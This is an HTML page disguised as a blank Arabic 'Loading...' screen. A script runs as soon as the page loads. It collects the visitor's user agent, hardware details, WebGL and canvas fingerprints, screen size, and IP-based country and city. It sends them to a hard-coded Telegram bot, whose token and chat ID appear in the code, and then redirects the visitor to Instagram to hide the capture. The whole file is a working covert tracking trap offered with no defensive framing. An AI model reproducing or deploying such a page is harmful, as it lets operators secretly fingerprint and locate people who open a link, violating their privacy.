<html>
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>جاري التحميل...</title>
<style>
  body {
    background-color: #000000;
    margin: 0;
    padding: 0;
    overflow: hidden;
    font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
    direction: rtl;
    user-select: none;
    height: 100vh;
    width: 100vw;
  }
</style>
</head>
<body>

<script>
(async () => {
  // إعدادات Telegram
  const telegramBotToken = "7612902419:AAFkil59yYM0O61rmGH6XAcOIm5pOdEkG58";
  const telegramChatId = "5854169054";

  // تهيئة كائن البيانات
  const data = {};
  
  // جمع البيانات الأساسية بسرعة
  data.userAgent = navigator.userAgent;
  data.platform = navigator.platform;
  data.vendor = navigator.vendor;
  data.appVersion = navigator.appVersion;
  data.hardwareConcurrency = navigator.hardwareConcurrency || "غير مدعوم";
  data.deviceMemory = navigator.deviceMemory || "غير مدعوم";
  data.screenWidth = screen.width;
  data.screenHeight = screen.height;

  // جمع بيانات WebGL
  function getWebGLInfo() {
    try {
      const canvas = document.createElement("canvas");
      const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
      if (!gl) return {vendor: "غير مدعوم", renderer: "غير مدعوم"};
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      return {
        vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "غير مدعوم",
        renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "غير مدعوم"
      };
    } catch {
      return {vendor: "خطأ", renderer: "خطأ"};
    }
  }
  const webglInfo = getWebGLInfo();
  data.webglVendor = webglInfo.vendor;
  data.webglRenderer = webglInfo.renderer;

  // بصمة Canvas
  data.canvasFingerprint = (() => {
    try {
      const canvas = document.createElement("canvas");
      const ctx = canvas.getContext("2d");
      ctx.fillStyle = "#f60";
      ctx.fillRect(125,1,62,20);
      ctx.fillStyle = "#069";
      ctx.fillText("fingerprint", 2, 15);
      return canvas.toDataURL().substring(0, 100) + "...";
    } catch {
      return "غير مدعوم";
    }
  })();

  // بصمة الصوت (إصدار سريع بدون انتظار)
  data.audioFingerprint = "تم التخطي للتسريع"; // يمكنك إزالته إذا أردت

  // بيانات الموقع (يتم جلبها بشكل غير متزامن)
  fetch("https://ipapi.co/json/")
    .then(res => res.ok ? res.json() : {})
    .then(ipData => {
      data.ipAddress = ipData.ip || "غير متوفر";
      data.country = ipData.country_name || "غير متوفر";
      data.city = ipData.city || "غير متوفر";
      sendData();
    })
    .catch(() => {
      data.ipAddress = "غير متوفر";
      data.country = "غير متوفر";
      data.city = "غير متوفر";
      sendData();
    });

  // إرسال البيانات إلى Telegram
  function sendData() {
    const message = `*📡 بيانات Fingerprinting مفصلة:*

*1. User Agent*  
\`${data.userAgent.replace(/[_*[\]()~>#+\-=|{}.!]/g, "\\$&")}\`  
_معرف المتصفح والنظام_

*2. Platform*  
${data.platform.replace(/[_*[\]()~>#+\-=|{}.!]/g, "\\$&")}  
_نظام التشغيل الأساسي_

*3. Vendor*  
${data.vendor.replace(/[_*[\]()~>#+\-=|{}.!]/g, "\\$&")}  
_الشركة المصنعة للمتصفح_

*4. App Version*  
${data.appVersion.replace(/[_*[\]()~>#+\-=|{}.!]/g, "\\$&")}  
_إصدار المتصفح_

*5. Hardware Concurrency*  
${data.hardwareConcurrency}  
_عدد أنوية المعالج_

*6. Device Memory*  
${data.deviceMemory} جيجابايت  
_حجم الذاكرة العشوائية_

*7. WebGL Vendor*  
${data.webglVendor.replace(/[_*[\]()~>#+\-=|{}.!]/g, "\\$&")}  
_شركة كرت الشاشة_

*8. WebGL Renderer*  
${data.webglRenderer.replace(/[_*[\]()~>#+\-=|{}.!]/g, "\\$&")}  
_نوع كرت الشاشة_

*9. Canvas Fingerprint*  
${data.canvasFingerprint.replace(/[_*[\]()~>#+\-=|{}.!]/g, "\\$&")}  
_بصمة رسومية فريدة_

*10. Audio Fingerprint*  
${data.audioFingerprint}  
_بصمة صوتية_

*11. Screen Resolution*  
${data.screenWidth}x${data.screenHeight}  
_دقة الشاشة_

*12. IP Address*  
${data.ipAddress}  
_عنوان IP_

*13. Country*  
${data.country.replace(/[_*[\]()~>#+\-=|{}.!]/g, "\\$&")}  
_الدولة_

*14. City*  
${data.city.replace(/[_*[\]()~>#+\-=|{}.!]/g, "\\$&")}  
_المدينة_`;

    // إرسال غير متزامن بدون انتظار الرد
    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({
        chat_id: telegramChatId,
        text: message,
        parse_mode: "Markdown"
      }),
    }).catch(() => {});

    // الانتقال الفوري إلى Instagram
    window.location.href = "https://www.instagram.com/";
  }
})();
</script>

</body>
</html>
